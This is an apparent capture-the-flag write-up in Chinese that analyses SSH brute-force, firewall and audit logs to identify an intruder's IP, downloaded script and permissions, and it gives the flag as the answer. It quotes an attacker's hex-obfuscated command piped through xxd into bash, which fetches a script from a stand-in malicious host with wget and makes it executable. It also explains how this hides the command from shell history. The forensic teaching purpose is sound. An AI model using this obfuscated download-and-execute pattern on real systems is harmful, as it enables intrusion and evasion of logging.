SSH 暴力破解与日志分析

应急响应2026-07-08

日志分析 WriteUp

题目信息

2026年某日凌晨，运维人员发现一台核心服务器 CPU 使用率异常升高。检查系统日志发现大量 SSH 失败记录，且有多条来自不同 IP 的成功登录。进一步查看审计日志，发现其中某次用户登录执行了可疑命令。分析附件中的 combined.log，其中包含认证日志、防火墙日志和审计日志。攻击者成功登录后，使用了混淆手法执行恶意命令。请找出攻击者的真实 IP、下载的恶意脚本文件名以及赋予的执行权限。

flag 格式：flag{IP_脚本名_权限}（例如 flag{192.168.5.231_test.sh_644}）

日志文件结构

combined.log 包含三种类型的日志：

日志类型 标识 内容
认证日志 sshd SSH 登录成功/失败记录
防火墙日志 kernel: [UFW ALLOW] iptables/UFW 放行记录
审计日志 audit 系统命令执行记录

解题步骤

步骤 1：分析 SSH 暴破阶段

日志文件前半部分（约 15000 行）为 SSH 暴破记录，大量不同外网 IP 尝试暴力破解 root 账户：

May 22 02:00:00 host sshd[10010]: Failed password for root from 185.130.5.253 port 42650 ssh2
May 22 02:00:00 host sshd[10014]: Failed password for root from 134.209.42.17 port 44293 ssh2
May 22 02:00:00 host sshd[10039]: Failed password for root from 46.101.88.33 port 48545 ssh2
...

暴破 IP 列表：185.130.5.253、134.209.42.17、46.101.88.33、159.89.180.24、45.33.22.11、193.106.30.99、103.56.12.87、162.243.12.5、5.188.86.123、89.248.165.99、198.98.55.120、185.165.29.111

步骤 2：定位防火墙日志

在约第 15002 行发现唯一的 UFW 防火墙放行记录：

May 22 02:01:03 host kernel: [UFW ALLOW] IN=eth0 OUT= MAC= SRC=203.0.113.88 DST=10.0.0.10 PROTO=TCP SPT=52341 DPT=22

这说明外网 IP 203.0.113.88 通过防火墙连接到了服务器的 22 端口。

步骤 3：定位成功登录记录

搜索 Accepted password，发现大量来自不同 IP 的成功登录：

May 22 02:01:06 host sshd[42538]: Accepted password for admin from 193.106.30.99 port 46118 ssh2
May 22 02:01:16 host sshd[23450]: Accepted password for admin from 192.168.1.37 port 40216 ssh2
May 22 02:01:40 host sshd[21432]: Accepted password for admin from 10.0.0.18 port 49383 ssh2
May 22 02:01:51 host sshd[48121]: Accepted password for admin from 203.0.113.88 port 52341 ssh2
May 22 02:02:03 host sshd[45111]: Accepted password for admin from 10.0.0.27 port 56862 ssh2
...

步骤 4：审计日志中发现混淆命令

在审计日志中，第 15027-15028 行发现异常命令执行（注意时间 02:02:05）：

May 22 02:02:05 host audit[12349]: type=EXECVE msg=audit(...): a0="echo" a1="7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368"
May 22 02:02:05 host audit[12350]: type=EXECVE msg=audit(...): a0="sh" a1="-c" a2="echo '7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368' | xxd -p -r | bash"

攻击者使用的混淆手法： 1. 将恶意命令转换成 hex 编码 2. 使用 echo 'hex' | xxd -p -r | bash 的方式解码并执行 3. 避开了 bash_history 中直接记录敏感命令

步骤 5：解码 hex 还原命令

hex 字符串：

7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368

解码后得到：

wget http://malicious.com/update.sh -O /tmp/update.sh && chmod 755 /tmp/update.sh

步骤 6：提取关键信息

恶意脚本文件名

从 wget http://malicious.com/update.sh -O /tmp/update.sh 可知：

  • 下载 URL：http://malicious.com/update.sh
  • 保存路径：/tmp/update.sh
  • 脚本文件名：update.sh

赋予的执行权限

从 chmod 755 /tmp/update.sh 可知：

  • 权限值：755（即 rwxr-xr-x，所有者可读写执行，组和其他用户可读执行）

攻击者真实 IP

需要结合防火墙日志和 SSH 登录日志综合判定：

  1. UFW 防火墙日志是唯一记录了外网真实 IP 的来源：
May 22 02:01:03 host kernel: [UFW ALLOW] IN=eth0 OUT= MAC= SRC=203.0.113.88 DST=10.0.0.10 PROTO=TCP SPT=52341 DPT=22
  1. 端口号 52341 与 SSH 成功登录记录完全匹配：
May 22 02:01:51 host sshd[48121]: Accepted password for admin from 203.0.113.88 port 52341 ssh2
  1. 时间线分析：
时间 事件 说明
02:01:03 UFW ALLOW 203.0.113.88 → 10.0.0.10 外网连接通过防火墙
02:01:51 SSH 成功登录 203.0.113.88 攻击者建立会话
02:02:03 SSH 成功登录 10.0.0.27 内部 IP 登录（正常运维）
02:02:05 audit[12347: id] + audit[12348: exit] 内部运维人员查看身份后退出
02:02:05 audit[12349-12351]: 恶意命令执行 攻击者通过 203.0.113.88 会话执行恶意命令

攻击者真实 IP：203.0.113.88

关键判断依据：10.0.0.27 执行了 id 和 exit 后退出，是正常的运维操作。而恶意命令紧随其后，来自先期已建立的 203.0.113.88 会话。UFW 日志中的 SRC=203.0.113.88 是攻击者未经 NAT 转换的真实外网 IP。

Flag

flag{203.0.113.88_update.sh_755}

攻击还原总结

阶段 描述
信息收集 外网多个 IP 对服务器 22 端口进行 SSH 暴破
突破边界 攻击者从 203.0.113.88 通过 UFW 防火墙进入服务器
成功登录 02:01:51 以 admin 账户 SSH 登录服务器
命令混淆 02:02:05 使用 echo hex | xxd -p -r | bash 手法执行恶意命令
下载脚本 wget http://malicious.com/update.sh -O /tmp/update.sh
赋予权限 chmod 755 /tmp/update.sh，赋予脚本可执行权限
后续操作 whoami 确认当前身份（与审计日志 12351 对应）

快速查找方法（命令行）

# 1. 搜索成功登录记录
Select-String "Accepted password" combined.log

# 2. 搜索审计日志中的命令执行
Select-String "audit" combined.log

# 3. 搜索涉及 xxd / wget 的可疑行
Select-String "xxd|wget|chmod" combined.log

# 4. 解码 hex
[System.Text.Encoding]::UTF8.GetString([byte[]]@(0x77,0x67,0x65,0x74,...))
